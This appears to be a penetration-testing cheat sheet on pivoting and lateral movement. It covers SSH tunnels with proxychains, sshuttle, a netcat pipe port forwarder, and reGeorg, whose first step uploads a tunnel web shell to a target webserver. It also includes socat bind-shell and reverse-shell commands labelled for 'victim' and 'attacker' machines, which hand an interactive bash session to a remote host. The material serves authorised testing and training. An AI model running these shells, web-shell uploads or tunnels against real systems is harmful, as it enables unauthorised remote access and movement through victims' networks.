#pivoting #lateral-movement
# Check if your tunnel is active and running: 

- nc -z localhost port || echo 'no tunnel open'
- netstat -lpnt | grep port | grep ssh
- ps aux | grep ssh
- ss -ntlp

# SSH Tunneling

Note: Target must have SSH running for there service

1. Create SSH Tunnel: ssh -D localhost:local port -f -N user@localhost -p Target Port
2. Setup ProxyChains. Edit the following config file (/etc/proxychains.conf)
3. Add the following line into the config: Socks5 127.0.0.1 Local Port
4. Run commands through the tunnel: proxychains command

# SShuttle

In Kali

Source: https://github.com/sshuttle/sshuttle

- sshuttle -r root@172.21.0.0 10.2.2.0/24
- sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa' # Daemon mode
- sshuttle -D --dns -vr user@yourserver.com 0/0 --ssh-cmd 'ssh -i /your/key/path.pem' # Daemon mode with DNS
- Working with your .ssh/config:
```
sshuttle --dns -vr user@server 0/0 --ssh-cmd 'ssh jumpbox'
sshuttle --dns -r myserver 0/0 -x <server-IP>
```

# Socat

## Bind Shell

```
victim> socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:443
```

## Reverse Shell

```
attacker> socat TCP-LISTEN:443,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:443 EXEC:bash,pty,stderr,setsid,sigint,sane
```

# Port Forwarder
1. mknod pivot p
2. nc -l -p < port to listen on> 0<pivot | nc "target" "pivot-port" 1>pivot

# reGeorg

Source: https://github.com/sensepost/reGeorg

Note: reGeorg requires Python 2.7 and the following modules:

urllib3 - HTTP library with thread-safe connection pooling, file post, and more.

1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver
2. Configure the tool to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py
```
python reGeorgSocksProxy.py -p 8080 -u http://upload.megacorpone.net:8080/tunnel/tunnel.jsp
```